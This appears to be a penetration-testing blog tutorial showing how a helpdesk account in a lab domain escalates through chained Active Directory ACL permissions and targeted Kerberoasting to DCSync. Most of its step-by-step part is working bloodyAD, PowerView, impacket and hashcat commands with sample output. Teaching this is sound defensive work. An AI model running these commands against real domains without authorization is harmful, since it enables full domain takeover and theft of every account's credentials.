---
title: "Active Directory Penetration Testing: ACL Abuse — From a Helpdesk Account to DCSync"
date: 2026-08-12
categories: [Active Directory, Privilege Escalation]
tags: [acl-abuse, bloodhound, bloodyad, powerview, dcsync, active-directory]
---

## Introduction

We've covered the path from a Linux foothold to Active Directory enumeration and getting first credentials in [Active Directory Penetration Testing: How It All Starts](https://3x0t1k.github.io/posts/initial-enumeration-active-directory/). From there, we went deeper into specific techniques — how Responder, LLMNR, and NBT-NS actually work in [that post](https://3x0t1k.github.io/posts/llmnr-nbtns-poisoning/), and the mechanics behind AS-REP Roasting and Kerberoasting in [this one](https://3x0t1k.github.io/posts/kerberos-asreproasting-kerberoasting/).

Now the question becomes: we have credentials — maybe one set, maybe two — so what next?

I touched on this briefly in one of the earlier posts — checking what our user's actual permissions look like, and finding out they're just a Tier 1 helpdesk account. That's exactly the direction we're going here. With credentials in hand, we run Kerberoasting, pick up service account credentials, and from there the path branches — but before jumping to those branches, the most fundamental thing to do is map **ACL relationships** across the domain.

Who has rights over whom. What objects control other objects. And most importantly — does our helpdesk user, through a chain of permissions nobody intended to connect, have a path to Domain Admin?

Here's the chain we're going to walk through in this post:

- `r.nilson` (HelpDesk Tier I) has `User-Force-Change-Password` over `j.carter`, a member of HelpDesk Tier III — we change his password after agreeing this with the client
- Authenticated as `j.carter`, we discover that HelpDesk Tier III has rights to add members to the **Web Server Admins** group — we add `r.nilson`
- Web Server Admins has `GenericWrite` over domain user objects — we attempt targeted Kerberoasting on a Domain Admin account, but the password is too strong and the hash doesn't crack
- We pivot — set an SPN on `m.harris`, a regular user account in the Exchange Windows Permissions group without an existing SPN, Kerberoast it, crack the hash
- Authenticated as m.harris, whose group has `WriteDacl` on the domain object — we grant ourselves DCSync rights and dump all domain hashes

Each step is a real permission that someone set at some point and never cleaned up. This is what ACL abuse looks like in practice — not one powerful permission, but a series of ordinary-looking ones chained together in a way nobody necessarily intended.

Let's break it down.

---

## Why This Chain Is Real

Every permission and technique in this chain is based on configurations and attack paths that occur in real Active Directory environments. None of it requires an exotic misconfiguration or a zero-day.

**User-Force-Change-Password on a helpdesk account** — helpdesk staff routinely need to reset passwords for users they support. IT departments delegate this right all the time, often through group nesting or directly on an OU. The problem is that delegations get set up, people move roles, and nobody goes back to clean them up. A Tier 1 technician who moved to a different team three years ago might still have reset rights over accounts they no longer support.

**HelpDesk Tier III having AddMember rights over another group** — group management delegation follows the same pattern. Someone at some point decided that HelpDesk Tier III should be able to manage membership of a specific group — maybe to onboard contractors, maybe to manage a resource group. The delegation is still there.

**Web Server Admins having GenericWrite over user objects** — GenericWrite at an OU level gets set because someone needed to automate something, manage SPNs, or configure service accounts. Applied broadly, forgotten.

**Exchange Windows Permissions having WriteDacl on the domain object** — this is the most documented one. Exchange, when installed in older versions, modifies domain-level permissions to allow its service accounts to replicate directory data. This is known, documented behavior. In many organizations running on-prem Exchange or that migrated from it, these permissions are still there. Exchange set it up, nobody removed it after migration.

Worth being clear here: it's not the group name that makes this exploitable — it's the specific ACE on the domain object. If that ACE didn't exist, the group name would mean nothing. This is the central point of the whole post: don't trust what an object is called. Follow the effective permissions.

As for `m.harris` being a regular user account in that group without an SPN — this also happens. Exchange Windows Permissions isn't supposed to contain regular user accounts, but group membership gets messy over time. Someone adds a user temporarily to troubleshoot a mail flow issue, to grant them specific access, or by mistake during a bulk group management operation. The account stays, the SPN was never set because nobody intended it to be a service account, which means no existing Kerberoastable ticket — but since we have GenericWrite over user objects, we can set one ourselves and create the attack surface that wasn't there before.

The chain works because AD is a living environment. Permissions accumulate. Delegations get added and never reviewed. People leave, roles change, migrations happen — and the ACL stays exactly as it was when it was last touched. BloodHound exists specifically because this pattern is so common that automating the graph search is worth building an entire tool around it.

---

## Quick Glossary — ACL Terms Worth Knowing

Before touching any tooling, here's the vocabulary that keeps coming up.

**ACE (Access Control Entry)** — a single rule: "this principal has this permission over this object." Every object in AD has a list of these attached to it.

**DACL (Discretionary Access Control List)** — the full list of ACEs on an object. When people say "check the ACL on this group," they mean checking its DACL.

**GenericWrite** — lets you write to most non-protected attributes on an object. On a group, this typically means you can modify the `member` attribute — in other words, add yourself to the group.

**GenericAll** — full control over the object. Covers everything GenericWrite does and more: change passwords, modify group membership, alter other attributes, effectively own the object.

**WriteDacl** — lets you modify the object's own DACL. This is the dangerous one in our chain: if you can write to an object's ACL, you can grant yourself *any* permission over that object afterward — including rights that weren't there originally.

**WriteOwner** — lets you change who owns the object. Ownership itself carries implicit rights to modify the DACL, so this is another path to the same place as WriteDacl, just one step removed.

**Extended Rights** — a special category of permissions tied to specific actions rather than general read/write access. DCSync rights (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`) fall into this category — they're not something you "have" by default on most objects, they're granted explicitly via ACE, usually on the domain object itself.

### Other Permissions Worth Knowing

The above cover our chain, but they're not the full list. A few more that show up constantly in real environments:

**WriteProperty** — write access to one specific attribute, rather than the broad access GenericWrite gives you. More surgical, less obvious in an ACL review.

**Self / Self-Membership** — a specific right to add *yourself* to a group, separate from GenericWrite on the `member` attribute. Functionally similar outcome, different underlying permission.

**AllExtendedRights** — grants every extended right at once on an object. If you see this on the domain object, that includes DCSync rights bundled in.

**User-Force-Change-Password** — an extended right letting you reset a user's password without knowing the current one. The first step in our chain.

**WriteAccountRestrictions** — relevant for computer objects. Having this lets you configure Resource-Based Constrained Delegation (RBCD), a topic for a dedicated post later.

**AddKeyCredentialLink** — write access to `msDS-KeyCredentialLink`. This is exactly the permission behind Shadow Credentials, which we touched on briefly in the [LLMNR/relay post](https://3x0t1k.github.io/posts/llmnr-nbtns-poisoning/).

Most real ACL abuse chains you'll find in the wild are combinations of these — not one exotic permission, but a series of ordinary-looking ones that chain together into something nobody intended.

---

## Tools for ACL Enumeration

Before walking through the chain, let's talk about what we're using to enumerate and abuse these permissions.

BloodHound will get a mention here — it's the go-to tool for visualising attack paths and is excellent at showing chains like the one above in a single graph. There are plenty of tutorials and videos on it already, so we won't spend too much time on it. If you haven't used it — go watch a couple of videos, run the collector, and you'll get it quickly. It's not complicated.

What we'll focus on more here is **bloodyAD** — a Python tool that lets you query and manipulate AD objects over LDAP directly from Linux. It's useful for targeted, point-by-point ACL operations without mass enumeration.

### bloodyAD — Overview

bloodyAD talks to the DC directly over LDAP using your credentials. The syntax is consistent across operations:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 <command>
```

A few basic things you can do with it:

```bash
# Get info about a specific user
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 get object r.nilson

# Get group membership of a user
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 get membership r.nilson

# Get members of a group
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 get object "HelpDesk Tier III" --attr member

# Get ACL on a specific object
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 get writable --otype USER
```

The last command is particularly useful — it shows you which objects the current user has write access to, which is the starting point for finding your attack path.

We'll use bloodyAD throughout this post to execute each step of the chain, alongside PowerView for Windows-side verification where relevant.

### PowerView — When You're on Windows

If you land on a Windows host inside the domain — whether through a shell on a workstation, a C2 agent, or any other means — bloodyAD isn't your tool. Instead you reach for **PowerView**, a PowerShell module from PowerSploit that talks to AD natively through .NET LDAP calls.

The same enumeration, different syntax:

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Check what r.nilson can write to
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "r.nilson" }

# Get group membership of j.carter
Get-DomainGroupMember -Identity "HelpDesk Tier III"

# Check ACL on a specific object
Get-DomainObjectAcl -Identity "Web Server Admins" -ResolveGUIDs

# Find all users with ForceChangePassword rights
Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -match "User-Force-Change-Password" }
```

For abuse, the same primitives work from PowerView:

```powershell
# Change j.carter's password
$NewPassword = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force
Set-DomainUserPassword -Identity j.carter -AccountPassword $NewPassword

# Add r.nilson to Web Server Admins
Add-DomainGroupMember -Identity "Web Server Admins" -Members r.nilson

# Set SPN on m.harris
Set-DomainObject -Identity m.harris -Set @{servicePrincipalName='fake/corp.local'}

# Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity r.nilson -Rights DCSync
```

The concepts are identical — the tooling just adapts to where you're running from. Linux with valid credentials — bloodyAD over LDAP. Windows shell inside the domain — PowerView through native AD interfaces. Either way, you're reading and writing the same attributes on the same objects.

One thing worth noting: PowerView's `Find-InterestingDomainAcl` generates a significant amount of LDAP traffic since it pulls ACLs for every object in the domain. If OPSEC matters, be deliberate — target specific objects rather than scanning everything at once.

---

## The Chain — Step by Step

### Step 1 — Finding What r.nilson Can Write To

First thing after getting credentials — check what objects our user has write access to:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 get writable --otype USER
```

Output:

```
distinguishedName: CN=John Carter,CN=Users,DC=corp,DC=local
accessRight: RESET_PASSWD
```

`r.nilson` has `RESET_PASSWD` (`User-Force-Change-Password`) over `j.carter`. Let's see who j.carter is and what groups he belongs to:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 get membership j.carter
```

Output:

```
distinguishedName: CN=John Carter,CN=Users,DC=corp,DC=local
member of:
  CN=HelpDesk Tier III,CN=Users,DC=corp,DC=local
  CN=Domain Users,CN=Users,DC=corp,DC=local
```

j.carter is in HelpDesk Tier III. Interesting — but to know what that group can actually do, we need to check from j.carter's perspective, not r.nilson's. First we change the password, then we enumerate from the new identity.

---

### Step 2 — Changing j.carter's Password

After agreeing this with the client as part of the engagement scope, we reset j.carter's password:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 set password j.carter 'NewP@ss123!'
```

Output:

```
[+] Password changed successfully!
```

Now we enumerate from j.carter's context — this is what HelpDesk Tier III actually has write access to:

```bash
bloodyAD -u j.carter -p 'NewP@ss123!' -d corp.local --host 192.168.1.10 get writable --otype GROUP
```

Output:

```
distinguishedName: CN=Web Server Admins,CN=Users,DC=corp,DC=local
accessRight: WRITE_MEMBER
```

j.carter — through HelpDesk Tier III membership — can add members to Web Server Admins. Now we know the path.

---

### Step 3 — Adding r.nilson to Web Server Admins

Now authenticated context of j.carter — we add r.nilson to Web Server Admins:

```bash
bloodyAD -u j.carter -p 'NewP@ss123!' -d corp.local --host 192.168.1.10 add groupMember "Web Server Admins" r.nilson
```

Output:

```
[+] r.nilson added to Web Server Admins
```

Verify:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 get membership r.nilson
```

Output:

```
member of:
  CN=HelpDesk Tier I,CN=Users,DC=corp,DC=local
  CN=Web Server Admins,CN=Users,DC=corp,DC=local
  CN=Domain Users,CN=Users,DC=corp,DC=local
```

r.nilson is now in Web Server Admins.

---

### Step 4 — GenericWrite → Targeted Kerberoasting Attempt

Web Server Admins has GenericWrite over domain user objects. Because the effective permissions include write access to the `servicePrincipalName` attribute, we can associate a Kerberos service principal with any user in scope. First, let's try the Domain Admin:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 set object "Administrator" servicePrincipalName -v "fake/corp.local"
```

> The SPN here is deliberately synthetic — we're not pointing to a real service. The goal is simply to associate the account with a Kerberos service principal so a TGS can be requested and roasted.

Output:

```
[+] Attribute servicePrincipalName of Administrator changed
```

Kerberoast it:

```bash
impacket-GetUserSPNs corp.local/r.nilson:'Winter2025!' -dc-ip 192.168.1.10 -request-user Administrator
```

We get the hash — but hashcat runs for hours and comes back empty. Strong password. We need to clean up the SPN we set:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 set object "Administrator" servicePrincipalName -v ""
```

Pivot.

---

### Step 5 — Setting SPN on Exchange Group Member and Kerberoasting

Let's look for other interesting targets. We enumerate users in the Exchange Windows Permissions group:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 get object "Exchange Windows Permissions" --attr member
```

Output:

```
CN=svc_exchange,CN=Users,DC=corp,DC=local
CN=m.harris,CN=Users,DC=corp,DC=local
```

`svc_exchange` already has SPNs registered by Exchange itself — no need to touch it, just Kerberoast it directly. But we're more interested in `m.harris` — a regular user account in this group with no SPN set. Why? Because if we crack m.harris, we get an authenticated context inside the Exchange Windows Permissions group, which has WriteDacl on the domain object. That's our path to DCSync. svc_exchange might crack too, but m.harris is the more interesting target given what his group membership gives us.

We set a fake SPN on m.harris:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 set object "m.harris" servicePrincipalName -v "fake/corp.local"
```

Kerberoast:

```bash
impacket-GetUserSPNs corp.local/r.nilson:'Winter2025!' -dc-ip 192.168.1.10 -request-user m.harris
```

Output:

```
$krb5tgs$23$*m.harris$CORP.LOCAL$fake/corp.local*$a3f8c2...
```

Crack it:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*m.harris...*:Serv1ce@2019!
```

We have m.harris credentials. Clean up the SPN immediately:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --host 192.168.1.10 set object "m.harris" servicePrincipalName -v ""
```

---

### Step 6 — WriteDacl → Granting DCSync Rights

Exchange Windows Permissions group has WriteDacl on the domain object. Authenticated as m.harris — who is a member of that group — we grant r.nilson DCSync rights. `add dcsync` grants the trustee the directory-replication permissions required for DCSync on the domain object, including `Replicating Directory Changes` and `Replicating Directory Changes All` — the extended rights that allow an account to pull credential material via directory replication, the same mechanism domain controllers use to sync with each other.

```bash
bloodyAD -u m.harris -p 'Serv1ce@2019!' -d corp.local --host 192.168.1.10 add dcsync r.nilson
```

Output:

```
[+] r.nilson DCSync rights granted
```

---

### Step 7 — DCSync

```bash
impacket-secretsdump corp.local/r.nilson:'Winter2025!'@192.168.1.10 -just-dc
```

Output:

```
corp.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b4b52e4a3b4c1d5f6e7a8b9c0d1e2f3:::
corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
[*] Kerberos keys grabbed
```

Domain Admin hash in hand. Game over.

---

## Summary

Seven steps. One helpdesk account. Full domain compromise.

```
r.nilson (HelpDesk Tier I)
   │
   │ ForceChangePassword
   ▼
j.carter
   │
   │ HelpDesk Tier III → WriteMember
   ▼
Web Server Admins
   │
   │ GenericWrite → servicePrincipalName
   │
   ├──────────────────→ Administrator
   │                        │
   │                        └─ SPN → Kerberoast → password too strong → dead end
   │
   └──────────────────→ m.harris
                            │
                            └─ SPN → Kerberoast → cracked
                                        │
                                        │ Exchange Windows Permissions
                                        │ WriteDacl on domain object
                                        │ Replicating Directory Changes
                                        │ Replicating Directory Changes All
                                        ▼
                                     DCSync → all domain hashes
```

None of these permissions are exotic. Every one of these permissions can have a legitimate origin: delegated administration, application installation, group management, migrations, or automation. The problem is what happens when those permissions remain in place after the original requirement is gone.

---

## A Note on Reality

This is one scenario. In practice, no two environments look the same. Some will have completely different delegation structures, some will have no ACL misconfigurations worth exploiting at all, and some will have chains far more convoluted than what's shown here. The specific path from r.nilson to DCSync is not the point — the concept is.

When you have credentials, the question is always: what does this account touch, directly or through group membership, that gives you leverage over something else? The answer is in the ACL. BloodHound maps it visually, bloodyAD lets you query and abuse it surgically.

### ldapsearch for More Precise Queries

For finer-grained enumeration, `ldapsearch` is worth knowing. It talks directly to LDAP and gives you raw output — no abstraction, no tool-specific formatting. Useful when you want to inspect specific attributes or verify what a tool is reporting.

A couple of practical examples:

```bash
# Get all attributes of a specific user
ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
  -b "DC=corp,DC=local" "(sAMAccountName=m.harris)"

# Find all accounts with an SPN set
ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
  -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Get members of a specific group
ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
  -b "DC=corp,DC=local" "(cn=Exchange Windows Permissions)" member
```

ldapsearch doesn't abstract anything — you write the LDAP filter yourself and get back exactly what the DC returns. That makes it slower to use but more transparent than higher-level tools, which is useful when you want to verify what's actually sitting in the directory rather than trusting a tool's interpretation.

---

## What This Post Was Really About

This was built to show what problems can exist in an AD environment and how they can be chained together once you have a first credential. Not to hand you a reusable attack script — environments differ too much for that to be meaningful.

One thing worth pointing out explicitly: this chain deliberately combines two separate technique categories. ACL abuse got us into the right groups and gave us write access over user objects. Kerberoasting gave us credentials for an account we otherwise had no path to. Neither alone would have been enough — but together they completed the chain. That's the mindset worth developing: don't think in isolated techniques, think in combinations. What does this ACL give me access to? Can I create an attack surface that wasn't there before? Can I chain this with something from a completely different area?

Don't be afraid to experiment with your own chains. The ones that aren't in any playbook are often the ones that work in a real engagement. Think sideways.

In a real engagement this will not look this clean. You'll hit dead ends, permissions that don't behave as expected, accounts that are locked, paths that look promising and go nowhere. The value is in the mental model, not the specific chain: when you land with credentials, you enumerate ACLs, you follow what the permissions actually say, and you look for leverage — one step at a time.

The tooling changes, the environment changes, but the concept stays the same.
